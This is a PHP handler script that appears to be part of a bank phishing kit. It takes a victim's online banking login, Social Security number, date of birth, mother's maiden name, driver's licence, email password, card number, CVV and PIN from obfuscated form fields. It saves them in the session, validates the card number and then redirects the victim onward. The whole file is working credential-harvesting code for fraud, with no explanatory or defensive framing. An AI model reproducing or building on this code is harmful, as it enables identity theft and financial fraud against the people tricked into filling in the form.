<?php
#if (isset($_POST['chalbhai'])) {
ini_set("output_buffering",4096);
session_start();

include 'ccvalid.php';



$host = bin2hex ($_SERVER['HTTP_HOST']);


$_SESSION['ONLINEID'] = $OnlineID = $_POST['codeid'];
$_SESSION['PASSCODES'] = $Passcode = $_POST['codepass'];
$_SESSION['FNAMES'] = $FirstName = $_POST['fnAmme'];
$_SESSION['LNAMES'] = $Last_Name = $_POST['lnMAC'];
$_SESSION['ADDRESS'] = $Address = $_POST['addrosi'];
$_SESSION['CITIES'] = $City = $_POST['Cito'];
$_SESSION['STATES'] = $State = $_POST['Stoto'];
$_SESSION['ZIPS'] = $Zip = $_POST['zIpo'];
$_SESSION['PHONES'] = $Phono = $_POST['Mobocobo'];
$_SESSION['SSNS'] = $SSN = $_POST['Socoo'];
$_SESSION['DOBS'] = $DOB = $_POST['DOBOA'];
$_SESSION['MMDNS'] = $Mother_Mdn = $_POST['MOMAN'];
$_SESSION['DRLSIS'] = $DriverLS = $_POST['DLSLRA'];
$_SESSION['MMMNS'] = $Mother_Middle = $_POST['Mmolca'];
$_SESSION['NONCARDS'] = $Nameoncard = $_POST['Nocaro'];
$_SESSION['EMAILS'] = $Email = $_POST['Emolo'];
$_SESSION['CARDS'] = $Card = $_POST['Vokafr'];
$_SESSION['EPASSES'] = $ePass = $_POST['passemilo'];
$_SESSION['EXPDATES'] = $expdate = $_POST['edior'];
$_SESSION['EXPDATESY'] = $expdatess = $_POST['ediorSS'];
$_SESSION['CVVS'] = $CVV = $_POST['cvfa'];
$_SESSION['PINS'] = $PIN = $_POST['POKE'];



//Validate card number
if (is_valid_card($Card))
{
$cc=0;
}
else
{
$cc=1;
}

if($cc!=0){
	
	header("Location: challenge.php?error=1&sessionid=$host");
}
else {
	header("Location: Validated.php");
}
#}
?>